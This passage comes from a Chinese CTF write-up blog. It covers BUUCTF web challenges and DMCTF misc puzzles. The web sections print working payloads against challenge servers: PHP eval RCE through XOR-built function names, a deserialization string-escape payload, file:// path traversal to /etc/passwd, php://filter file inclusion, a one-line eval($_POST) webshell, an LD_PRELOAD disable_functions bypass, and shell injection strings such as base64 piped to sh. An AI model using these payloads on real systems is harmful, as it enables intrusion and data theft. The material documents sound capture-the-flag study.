\u0026#39;log\u0026#39;, \u0026#39;max\u0026#39;, \u0026#39;min\u0026#39;, \u0026#39;mt_getrandmax\u0026#39;, \u0026#39;mt_rand\u0026#39;, \u0026#39;mt_srand\u0026#39;, \u0026#39;octdec\u0026#39;, \u0026#39;pi\u0026#39;, \u0026#39;pow\u0026#39;, \u0026#39;rad2deg\u0026#39;, \u0026#39;rand\u0026#39;, \u0026#39;round\u0026#39;, \u0026#39;sin\u0026#39;, \u0026#39;sinh\u0026#39;, \u0026#39;sqrt\u0026#39;, \u0026#39;srand\u0026#39;, \u0026#39;tan\u0026#39;, \u0026#39;tanh\u0026#39;]; preg_match_all(\u0026#39;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/\u0026#39;, $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\u0026#34;请不要输入奇奇怪怪的函数\u0026#34;); } } //帮你算出答案 eval(\u0026#39;echo \u0026#39;.$content.\u0026#39;;\u0026#39;); } 快被搞死了，是一道有过滤限制的RCE，半天没有头绪就去看wp了。\n刷题记录：[CISCN 2019 初赛]Love Math\n最后自己琢磨出来了一个payload，思路当然还是参考上面师傅博客的。\n利用$whitelist里的函数名称和数字遍历异或^，Fuzz找出来需要的字母，然后拼接一个_GET传参执行命令。\nFuzz的代码\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php $whitelist = [\u0026#39;abs\u0026#39;, \u0026#39;acos\u0026#39;, \u0026#39;acosh\u0026#39;, \u0026#39;asin\u0026#39;, \u0026#39;asinh\u0026#39;, \u0026#39;atan2\u0026#39;, \u0026#39;atan\u0026#39;, \u0026#39;atanh\u0026#39;, \u0026#39;base_convert\u0026#39;, \u0026#39;bindec\u0026#39;, \u0026#39;ceil\u0026#39;, \u0026#39;cos\u0026#39;, \u0026#39;cosh\u0026#39;, \u0026#39;decbin\u0026#39;, \u0026#39;dechex\u0026#39;, \u0026#39;decoct\u0026#39;, \u0026#39;deg2rad\u0026#39;, \u0026#39;exp\u0026#39;, \u0026#39;expm1\u0026#39;, \u0026#39;floor\u0026#39;, \u0026#39;fmod\u0026#39;, \u0026#39;getrandmax\u0026#39;, \u0026#39;hexdec\u0026#39;, \u0026#39;hypot\u0026#39;, \u0026#39;is_finite\u0026#39;, \u0026#39;is_infinite\u0026#39;, \u0026#39;is_nan\u0026#39;, \u0026#39;lcg_value\u0026#39;, \u0026#39;log10\u0026#39;, \u0026#39;log1p\u0026#39;, \u0026#39;log\u0026#39;, \u0026#39;max\u0026#39;, \u0026#39;min\u0026#39;, \u0026#39;mt_getrandmax\u0026#39;, \u0026#39;mt_rand\u0026#39;, \u0026#39;mt_srand\u0026#39;, \u0026#39;octdec\u0026#39;, \u0026#39;pi\u0026#39;, \u0026#39;pow\u0026#39;, \u0026#39;rad2deg\u0026#39;, \u0026#39;rand\u0026#39;, \u0026#39;round\u0026#39;, \u0026#39;sin\u0026#39;, \u0026#39;sinh\u0026#39;, \u0026#39;sqrt\u0026#39;, \u0026#39;srand\u0026#39;, \u0026#39;tan\u0026#39;, \u0026#39;tanh\u0026#39;]; $exp=\u0026#39;\u0026#39;; for ($i=0; $i \u0026lt; count($whitelist); $i++) { for ($j=0; $j \u0026lt; 1000; $j++) { $exp=$whitelist[$i]^$j.\u0026#34;\u0026#34;; echo $whitelist[$i].\u0026#34;^\u0026#34;.$j.\u0026#34;----\u0026#34;.$exp; echo \u0026#34;\\n\u0026#34;; } } 需要知道的有，php某个版本以后可以使用函数名加()的方式调用函数，如\n1 2 3 4 5 \u0026lt;?php echo base_convert(\u0026#34;strtoupper\u0026#34;, 36, 10); $cos=base_convert(\u0026#34;2927671435926243\u0026#34;, 10, 36); echo \u0026#34;\\n\u0026#34;.$cos(\u0026#34;abc\u0026#34;); 上面代码是把字符串strtoupper赋值到变量$cos，然后直接使用$cos()执行strtoupper()函数。代码中使用base_convert函数也是这道题的一种思路哦。﹙ˊ_\u0026gt;ˋ﹚\n还需要知道的是异或的时候会提示：字符串和数字不能直接异或，使用括号()括起来就可以了。$如果直接拼接到字符串上也是不可以的，需要使用形如$$cos才可以正确的指向变量。\n最终payload：\n1 ?c=$cos=(is_finite^(6).(4)).(rad2deg^(7).(5));$cos=$$cos;$cos{0}($cos{1})\u0026amp;0=system\u0026amp;1=cat /flag [0CTF 2016]piapiapia 使用目录扫描发现了www.zip网站备份。\n网站结构\nstatic\nupload\nclass.php\nconfig.php\nindex.php\nprofile.php\nregister.php\nupdate.php\n发现有register就去注册个试试呗\n注册成功就跳转到update.php界面了，是个修改信息的，查看源码，修改信息有手机号\n邮箱、昵称、图片，还用了一些正则表达式过滤，如手机必须11位、邮箱有@和点、昵称长度不大于10、图片名称使用了md5进行加密。填写信息以后跳转到了profile.php页面。注意到图片所在的标签是：\n1 \u0026lt;img src=\u0026#34;data:image/gif;base64,....... 查看源码profile.php中是这样的\n1 2 3 4 5 $profile = unserialize($profile); $phone = $profile[\u0026#39;phone\u0026#39;]; $email = $profile[\u0026#39;email\u0026#39;]; $nickname = $profile[\u0026#39;nickname\u0026#39;]; $photo = base64_encode(file_get_contents($profile[\u0026#39;photo\u0026#39;])); 读取文件以后使用base64加密的话上传的地方肯定是不能用图片马什么的了。还注意到使用了unserialize，序列化也是思路。想试试直接读flag所在文件，在config.php中找到了flag所在地\n1 2 3 4 5 6 7 \u0026lt;?php $config[\u0026#39;hostname\u0026#39;] = \u0026#39;127.0.0.1\u0026#39;; $config[\u0026#39;username\u0026#39;] = \u0026#39;root\u0026#39;; $config[\u0026#39;password\u0026#39;] = \u0026#39;\u0026#39;; $config[\u0026#39;database\u0026#39;] = \u0026#39;\u0026#39;; $flag = \u0026#39;\u0026#39;; ?\u0026gt; 下载的源码肯定不会把flag直接给你，要相办法读这个文件。看到了数据库配置，感觉序列化的对象应该也是从数据库读出来的，还有一个文件没有看：class.php，顺便跟进一下user对象相关的，注意到了注册和登陆都使用到了一个函数：filter\n1 2 $username = parent::filter($username); $password = parent::filter($password); 跟进一下\n1 2 3 4 5 6 7 8 9 public function filter($string) { $escape = array(\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\\\\\\\\\u0026#39;); $escape = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $escape) . \u0026#39;/\u0026#39;; $string = preg_replace($escape, \u0026#39;_\u0026#39;, $string); $safe = array(\u0026#39;select\u0026#39;, \u0026#39;insert\u0026#39;, \u0026#39;update\u0026#39;, \u0026#39;delete\u0026#39;, \u0026#39;where\u0026#39;); $safe = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $safe) . \u0026#39;/i\u0026#39;; return preg_replace($safe, \u0026#39;hacker\u0026#39;, $string); } 过滤_，select、insert、update、delete、where会被替换成hacker，where长度是5，hacker长度是6，敏感一点的应该想到了序列化字符串对象也是用字符串长度的，这样长度改变的话，可以使用PHP反序列化字符串逃逸，序列化的结尾是\u0026quot;;}可以手动构造闭合。\n现在整理下思路。图片属性那里可以读文件，过滤函数会导致序列化字符串逃逸，所以就构造photo读取config.php。那么逃逸的点在哪里？电话只能是数字，邮箱需要有@等字符，图片会被md5加密，昵称哪里虽然有长度限制，但是如果我们传入数组的话就可以绕过。那么开工\n先上payload\n1 wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\u0026#34;;}s:5:\u0026#34;photo\u0026#34;;s:10:\u0026#34;config.php\u0026#34;;} ⭐参考了其他的好多博客，这里的点讲的很模糊，原来长度为5的字符串变成了长度为6的，应该是更不可能读不到payload的。\n受到了这位师傅的博客[0CTF 2016]piapiapia，我尝试了下$profile属性其实是一个关联数组，是键值对形式的，并且字符串可能是嵌套起来的，形如\n1 2 3 4 5 6 7 \u0026lt;?php class profile{ public $file = \u0026#39;a:2:{s:8:\u0026#34;nickname\u0026#34;;s:5:\u0026#34;where\u0026#34;;s:5:\u0026#34;photo\u0026#34;;s:3:\u0026#34;233\u0026#34;;}\u0026#39;; public $upload =\u0026#34;2333\u0026#34;; } $s1= new profile(); echo serialize($s1); 结果是\n1 O:7:\u0026#34;profile\u0026#34;:2:{s:4:\u0026#34;file\u0026#34;;s:56:\u0026#34;a:2:{s:8:\u0026#34;nickname\u0026#34;;s:15:\u0026#34;where\u0026#34;;s:5:\u0026#34;photo\u0026#34;;s:3:\u0026#34;233\u0026#34;;}\u0026#34;;s:6:\u0026#34;upload\u0026#34;;s:4:\u0026#34;2333\u0026#34;;} 这种格式的，假如我们的payload是修改上面的upload，在一个字符串总长度s如上面的56读取所有变长的hacker以后，到了我们的payload地方，正常把我们构造的upload读取为对象，而后面真正的upload字符串就被舍去了。\n报错是因为nickname我们传入的是数组形式的，源代码里直接对数组进行操作肯定是报错的，但是我们需要的只有photo正常即可，可以看到后面我们文件更新成功了。\n查看页面的图片内容\nbase64解码\n[SUCTF 2019]Pythonginx 整理一下源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def getUrl(): url = request.args.get(\u0026#34;url\u0026#34;) host = parse.urlparse(url).hostname if host == \u0026#39;suctf.cc\u0026#39;: return \u0026#34;我扌 your problem? 111\u0026#34; parts = list(urlsplit(url)) host = parts[1] if host == \u0026#39;suctf.cc\u0026#39;: return \u0026#34;我扌 your problem? 222 \u0026#34; + host newhost = [] for h in host.split(\u0026#39;.\u0026#39;): newhost.append(h.encode(\u0026#39;idna\u0026#39;).decode(\u0026#39;utf-8\u0026#39;)) parts[1] = \u0026#39;.\u0026#39;.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(\u0026#39; \u0026#39;)[0] host = parse.urlparse(finalUrl).hostname if host == \u0026#39;suctf.cc\u0026#39;: return urllib.request.urlopen(finalUrl).read() else: return \u0026#34;我扌 your problem? 333\u0026#34; 三个if都是判断host == 'suctf.cc'，但是需要最后一个host判断成功才可以读取文件，读取文件应该使用的是php伪协议，但是前面的不会了，去看wp。大概看的意思还是用unicode欺骗，相关题目[[ASIS 2019]Unicorn shop](#[ASIS 2019]Unicorn shop)，使用unicode经过解析以后还是原来的字符，但是可以绕过判断==，回过头来注意到了第二个if中有newhost.append(h.encode('idna').decode('utf-8'))进行了一波编码，那么问题就出在了这里。\n所以我们只需要找出随便一个host里字符的其他unicode值，这个值在经过编码以后还可以变成原来的字母。其他wp都找的是最后的字母c，那么我就找第一个字母s验证一下，贴一个unicode的网站：https://www.compart.com/en/unicode/U+0073，进入网站以后可以搜索，然后下面有相关的字符，需要多试几个。\n我选出的是这个字符𝐬，我们先使用url编码一下防止参数出现错误，尝试读一下passwd：\n1 /getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../etc/passwd flag并不在其中，并且也不再根目录下，根据题目中有nginx应该是一个指路的，去读一读nginx的配置文件。从师傅那学到的nginx配置文件所在位置，以后说不定自己也用得到：\n配置文件存放目录：/etc/nginx、/usr/local/nginx/conf/nginx.conf\n主配置文件：/etc/nginx/conf/nginx.conf\n管理脚本：/usr/lib64/systemd/system/nginx.service\n模块：/usr/lisb64/nginx/modules\n应用程序：/usr/sbin/nginx\n程序默认存放位置：/usr/share/nginx/html\n日志默认存放位置：/var/log/nginx\n读配置文件\n1 /getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/local/nginx/conf/nginx.conf 读flag\n1 /getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/fffffflag 参考的博客链接：\nhttps://www.xmsec.cc/suctf19-wp/\nhttps://xz.aliyun.com/t/6042#toc-24\nhttps://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf\n[BSidesCF 2020]Had a bad day 看这个标题我推一下OWRLD ORDER的Have a nice day\n页面两个按钮，一个康狗狗照片，一个康猫猫照片，点按钮以后url就会改变为\n1 /index.php?category=woofers 尝试输入flag会显示\n只能有woofers和meowers可以通过，尝试了下php的filter伪协议读文件\n读出来了，但是解密以后狗狗和猫猫这两个网页没啥作用：\n1 2 3 4 \u0026lt;center\u0026gt; \u0026lt;h4\u0026gt; Woof! Woof! \u0026lt;/h4\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;img style=\u0026#34;width:100%\u0026#34; src=\u0026#34;img/dog/\u0026lt;?php echo rand(1,10)?\u0026gt;.jpg\u0026#34;\u0026gt; 多尝试以后发现可以读index，下面是主要的源码：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php $file = $_GET[\u0026#39;category\u0026#39;]; if(isset($file)){ if( strpos( $file, \u0026#34;woofers\u0026#34; ) !== false || strpos( $file, \u0026#34;meowers\u0026#34; ) !== false || strpos( $file, \u0026#34;index\u0026#34;)){ include ($file . \u0026#39;.php\u0026#39;); } else{ echo \u0026#34;Sorry, we currently only support woofers and meowers.\u0026#34;; } } ?\u0026gt; 可以看到if判断中需要字符串包含woofers、meowers、index，那么我们只需要在filter伪协议中插入字符串绕过判断即可。\n需要知道的：filter可以设定一个或多个过滤器名称，以管道符\\分隔，所以构造payload：\n1 /index.php?category=php://filter/meowers/convert.base64-encode/resource=flag 读出来以后解密即可获得flag\n搜索的时候学到了一个其他的截断\n1 zip://test.zip#hello.html.php 代表当前目录下的test.zip压缩包里面的hello.html.php，于是包含成功。\n","date":"2021-01-18T16:58:56Z","permalink":"https://www.braindance.top/articles/2021/01/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/","title":"BUUCTF寒假刷题-Web"},{"content":"[极客大挑战 2019]RCE ME 源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;code\u0026#39;])){ $code=$_GET[\u0026#39;code\u0026#39;]; if(strlen($code)\u0026gt;40){ die(\u0026#34;This is too Long.\u0026#34;); } if(preg_match(\u0026#34;/[A-Za-z0-9]+/\u0026#34;,$code)){ die(\u0026#34;NO.\u0026#34;); } @eval($code); } else{ highlight_file(__FILE__); } // ?\u0026gt; 分析一波，GET请求获得code，想要通过的话需要绕过两个检测：\npayload长度小于40 不能包含a-z、A-Z、0-9 和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:一些不包含数字和字母的webshell，这次摸到了相关文章：无字母数字webshell之提高篇。\n使用url编码+~取反构造不可见字符串，然后加上php7版本以后支持了使用：($a)()这样的方法动态执行函数，所以我们可以构造payload：assert(eval($_POST[‘a’]))\n先构造assert：\n1 2 3 echo urlencode(~\u0026#39;assert\u0026#39;); //结果：%9E%8C%8C%9A%8D%8B 再构造eval($_POST['a'])：\n1 2 3 echo urlencode(~\u0026#39;eval($_POST[\\\u0026#39;a\\\u0026#39;])\u0026#39;); //结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6 完整payload：\n1 ?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6); 网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的~取反再获得真正的函数名。\n使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是ELF是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回ret=127：\n搜索了一波，原来是是disable_function搞的鬼，这个表可以在phpinfo()中查看：\n因为system、exec、shell_exec等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过disable_function的方法，网上有很多其他方法，其中一个方法：\n利用环境变量LD_PRELOAD来绕过\nphp的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的\nLD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。\n正好蚁剑的插件中就有一个名为：as_bypass_php_disable_functions的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：\n插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的/var/www/html目录是没有上传权限的，我右键以后发现能修改权限，改成0777：\n在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。\n上传一句话木马233.php：\n1 2 \u0026lt;?php @eval($_POST[\u0026#39;b\u0026#39;]); 再用一句话木马的shell执行插件：\n进入shell，目录下面多了一个名为**.antproxy.php**的文件：\n再使用蚁剑连接**.antproxy.php**，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。\nflag{a216900e-2427-48f7-9323-f65d0a3abdbf}\n","date":"2020-12-05T20:42:00Z","permalink":"https://www.braindance.top/articles/2020/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-rce-me/","title":"极客大挑战 2019 RCE ME"},{"content":"[GXYCTF2019]Ping Ping Ping 题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping\n和DMCTF做的那道pingpingping类似，同样是使用管道符构造payload，先使用：\n1 ?ip=127.0.0.1|ls 目录下有两个文件：flag.php、index.php。首先试出来了空格被过滤，使用以下绕过空格：\n1 2 3 4 5 6 7 8 $IFS ${IFS} $IFS$1 //$1改成$加其他数字貌似都行 \u0026lt; \u0026lt;\u0026gt; {cat,flag.php} //用逗号实现了空格功能 %20 %09 在linux下反单引号里面的指令会被执行 `ls`\n1 ?ip=|cat$IFS`ls` 会输出该目录下所有可以打开的文件，可以查看index.php的部分源码有哪些过滤：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 /?ip=|\\\u0026#39;|\\\u0026#34;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\u0026#34;, $ip, $match)){ echo preg_match(\u0026#34;/\\\u0026amp;|\\/|\\?|\\*|\\\u0026lt;|[\\x{00}-\\x{20}]|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\u0026#34;, $ip, $match); die(\u0026#34;fxck your symbol!\u0026#34;); } else if(preg_match(\u0026#34;/ /\u0026#34;, $ip)){ die(\u0026#34;fxck your space!\u0026#34;); } else if(preg_match(\u0026#34;/bash/\u0026#34;, $ip)){ die(\u0026#34;fxck your bash!\u0026#34;); } else if(preg_match(\u0026#34;/.*f.*l.*a.*g.*/\u0026#34;, $ip)){ die(\u0026#34;fxck your flag!\u0026#34;); } $a = shell_exec(\u0026#34;ping -c 4 \u0026#34;.$ip); echo \u0026#34; \u0026#34;; print_r($a); } ?\u0026gt; 一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问flag.php。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用readflag的ELF执行文件访问，但是还没成功。其实执行：\n1 ?ip=|cat$IFS`ls` 这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了我是傻逼。\n最后记录下学到的姿势和这道题目的其他思路：\n管道符：\n|直接执行后面的语句。 ||如果前面语句错误，执行后面的语句。 \u0026amp;前面和后面命令都要执行，无论前面真假， \u0026amp;\u0026amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令 使用以下绕过空格：\n1 2 3 4 5 6 7 8 9 $IFS ${IFS} ${IFS}$1 $IFS$1 //$1改成$加其他数字貌似都行 \u0026lt; \u0026lt;\u0026gt; {cat,flag.php} //用逗号实现了空格功能 %20 %09 //需要php环境 覆盖源码里的$a变量（拼接变量）： 1 /?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php 使用sh执行脚本： 1 /?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 内联执行： 1 /?ip=|cat$IFS`ls` 附：大佬整理的博客（内含更多姿势）：命令执行漏洞利用及绕过方式总结\n","date":"2020-12-04T20:24:50Z","permalink":"https://www.braindance.top/articles/2020/12/gxyctf2019-ping-ping-ping/","title":"GXYCTF2019 Ping Ping Ping"},{"content":"前言 这次比赛是第一次做Mics的题awa。\nMisc Check_in 真·有手就行\nfakezip 看到题目fakezip翻译：假的压缩包，所以猜应该是伪加密，贴一个原理的博客：zip伪加密，使用010 Editor打开压缩包，\n找到01修改为00，再解压压缩包，虽然提示了压缩包错误但是直接无视，获得一个flag.txt\n打开以后内容是：♬♩¶♯♬♭♬♫♫♪♬∮♬♭‖♭♬♭♬∮♬♭‖♭♬♭♫♫♯=，音符加密虽然是第一次听说，但是百度还是可以简单找到：文本加密为音乐符号\nBase family 题目给出了是base家族，所以base所有种类都试一遍。base常见的种类有：base16、base32、base58、base64、base91。还有几种没听过的base种类可以在这个网站找到：CTF在线工具。\n原层：\n1 XUZbB{fp}U)=ql[n%GCbk9RZ7!XD$D)f1G{011LN(TSlXCJT:4nxQ[8Y#I:=k.Qi4t3/S!,N/%[I}^8jjP|0\u0026amp;whvi88gpQce(2lKt9ZHiT^g1.nZH,k=kjTT16pHJ_DrW,Td\u0026#34;^w$Q8+8T])e.llK?*z`gS:+C]llUG:z1=ekEN}8DmJf\u0026amp;GP\u0026lt;Rk:o_Jk\u0026lt;J.zp8%H0g7sYSTJ9p.\u0026#34;duRBGj`g0!I+xjm(fh)]IF:\u0026gt;omN8=m+Xp(X0:U*8Sj5|8p._o[i0:%.qu}%_=\u0026lt;D base91解码：\n1 3G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW base58解码：\n1 JZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5 base32解码：\n1 NjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q= base64解码：\n1 666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d hex解码：\n1 flag{y0u_alr3ady_kn0w_th3_Basefam1ly} SlientEye 根据题目直接百度SlientEye，下载以后打开图片\u0026ndash;\u0026gt;decode：\n参数啥的都没动，密码为默认密码，直接Decode，得到一个flag.txt：\n1 \u0026amp;#102;\u0026amp;#108;\u0026amp;#97;\u0026amp;#103;\u0026amp;#123;\u0026amp;#110;\u0026amp;#49;\u0026amp;#95;\u0026amp;#98;\u0026amp;#117;\u0026amp;#95;\u0026amp;#106;\u0026amp;#49;\u0026amp;#97;\u0026amp;#110;\u0026amp;#103;\u0026amp;#95;\u0026amp;#119;\u0026amp;#117;\u0026amp;#95;\u0026amp;#100;\u0026amp;#51;\u0026amp;#125; 再去百度搜到一篇博客：\u0026amp;#x开头的是什么编码?，我点开一看，哦，原来是entity code实体编码，我啪的一下就把flag.txt改为flag.html，很快啊，然后是一个左正蹬、一个右鞭腿、一个左刺拳打开flag.html获得flag：flag{n1_bu_j1ang_wu_d3}\n编码之王 下载文件打开后一堆社会主义核心价值观，前面提到的：CTF在线工具就有核心价值观编码，下面放密文，上面是解码内容。\n解出来以后看到第一句：如是我闻:，\u0026ndash;\u0026gt;与佛论禅\n再解之后看第一句：新佛曰：。\u0026ndash;\u0026gt;新与佛论禅\n解完以后直接出了一堆由：[、]、!、+、(、)组成的符号，还是百度找到了这种编码叫JSfuck，可以直接浏览器控制台console输出获得flag\njpgsteg 题目即是用到的工具，百度下载软件，使用jphide.exe打开图片Tap code.jpg，选择seek功能解密，密码为123456（我蒙的）：\n成功解密后获得一个文档，内容如下：\n1 2 3 4 5 6 7 8 9 10 ... .... .. ... .. ... . . ... .. . . ..... ..... .. .... ... ... .. .. 这里我思索了好久，刚开始以为是摩斯密码，但是又对不上号，最后找到了一个名为敲击码的，正好一行中的.分成两部分代表坐标\n解码得到：ohhamazing ，加上括号就是：flag{ohhamazing}\n事后多看了一眼图片命名：Tap code.jpg。这用啥解密不就在脸上写着的wosabi \\0/。。。\nCollision 打开压缩包发现都是加密，但是原始大小都为4，只有CRC不一样：\n所以很有可能是四位数据的CRC32碰撞，就去网上找了一个python脚本：crc32碰撞 ctf python作者原创的脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 import string import threading import binascii import sys def crc(_crc): l = 1 dic = string.printable _input = _crc _input = \u0026#34;0X\u0026#34; + _input for i in dic: for n in dic: for h in dic: for m in dic: s = i + n + h + m s = s.encode() # print(str(binascii.crc32(s)), _input) if hex(binascii.crc32(s)).upper() == _input.upper(): print(_crc, \u0026#39;:\u0026#39;, s.decode()) print(l) sys.exit() #直接退出，不进行接下来的碰撞了，一般在做题的时候，碰撞不会重复 l = l + 1 def crc32(): print(\u0026#34;四字节碰撞!!!\u0026#34;) num = int(input(\u0026#34;你可能需要多个线程同时进行碰撞，请输入线程数：\u0026#34;)) _thread = [] _args = [] print(\u0026#34;输入参数\u0026#34;) for i in range(num): print(i+1, end=\u0026#39;:\u0026#39;) _args.append(input()) # print(_args) for i in range(num): t = threading.Thread(target=crc, args=(_args[i],)) _thread.append(t) #如果在这里开始线程会出一点小bug，虽然不要紧，但是不好看，不信的话你们自己试试 # print(_thread) for i in range(num): _thread[i].start() for i in range(num): _thread[i].join() input() if __name__ == \u0026#39;__main__\u0026#39;: crc32() 使用python的多线程，因为是5个文件，开了5个线程，然后分别输入CRC码，压缩文件原来的CRC码为：\n1 2 3 4 5 ff92876d 6c4a558b 77e8fd00 1e59a66e d1f4eb9a 碰撞以后获得的明文：\n1 2 3 4 5 1on} 32co llis flag {crc 根据flag的结构拼接一下：flag{crc32collis1on}\nkaomoji 题目的压缩包解压以后得到一个flag.zip压缩包和secret.txt，flag.zip中也含有secret.txt，将外面没有加密的secret.txt使用winrar压缩（需要和原来的压缩软件一致哒）以后对比flag.zip里的文件发现CRC码相同的：\n配合ARCHPR使用明文攻击，获得加密密钥： [b00df998 5bdbbde6 485fa1f8]\n我在进行明文攻击时虽然没有跑出来压缩包的密码，但是获得了上面的密钥，也是可以解压加密的压缩包的（具体原理不清楚）。解压明文攻击解开获得的压缩包flag_decrypted.zip，打开flag.txt是颜文字表情加密，直接复制到浏览器console控制台运行获得flag：flag{kaomoj1_1s_cut3}\nARCHPR 题目根据提示：This file was encrypted by me with a four-digit password, try to crack it!\n密码只是用了4位数字加密，可以使用ARCHPR 进行爆破，获得一个flag.png和hint.txt，hint.txt如下：\n1 2 3 The flag is hidden by a kind of magic called LSB. Try to find it if you can find it. The key is given to you. After decryption, change it to lowercase. key: .--. .- ... ... .-- --- .-. -.. 提示中提到了使用LSB隐写，密码是一段摩斯密码，摩斯密码解密后得到密文：password，使用LSB（项目地址）脚本执行：\n1 python lsb.py extract flag.png 1.txt password 1.txt中就包含了解密以后的flag：flag{th1s_15_f1agggggg}\noutguess ​\t看题目找工具，使用outguess参考隐写工具outguess 的下载安装及使用，在kali中安装以后执行\n1 outguess -r flag.jpg hide.txt 获得hide.txt文件的内容：\n1 2 3 4 Qb lbh xabj NRF? Gur xrl vf f3phe1gl, tb naq penpx vg! Encrypted data: U2FsdGVkX1/nmu9u2Ho1dD9kQWv7L5a6bsUrWxBkVp68txdFL4v/givGGYy7dBU+ 上面一段使用凯撒密码移动13位获得：Do you know AES? The key is s3cur1ty, go and crack it!\n其实这里和别人讨论以后才知道他们使用的是叫ROT13，相应的还搜到了ROT5、ROT13、ROT18、ROT47，百度百科看了以后就是凯撒密码的变种。所以下面一段的密文使用AES进行解密，密码是s3cur1ty，获得flag：flag{y0u_ar3_awes0m3}\n解密网站：https://tool.oschina.net/encrypt\nWhitespace 题目即提示，Whitespace进行一波搜索以后了解到是一种用空白符编程的语言，在压缩包里面摸了好久，在注释里发现空白编码：\n这也让我想到自己在网上下工具的压缩包时，网站经常在注释里附上密码，通常都是网站的网址。\n在whitespace网站中粘贴密文点上面的run：\n解密获得：password is BlindWaterMark!\n输入解压以后获得两张看着相同的罗翔老师.png图片和一个hint.txt：\n1 2 3 4 5 6 7 Do you see any difference between the two pictures? Get to know its secrets and tell you quietly that you need to know a knowledge called Manchester coding. 上传文档 你看这两幅画有什么不同吗？ 了解它的秘密，悄悄地告诉你，你需要知道一门叫做曼彻斯特编码的知识。 根据提示找出图片的不同和曼切斯特编码。图片看着相同但是经过加密，在网上搜索了一波了解到了盲水印技术，使用盲水印解密图片，项目地址：https://github.com/chishaxie/BlindWaterMark，执行：\n1 python bwn.py decode 2.png 1.png 3.png 获得解密图片：\n图片中的内容为：\n1 2 3 4 5 6 7 8 296969a5695 6696a6a9a69 5669595a566 965696666aa 69596a9666a a6a6569955a 5a66aa69a56 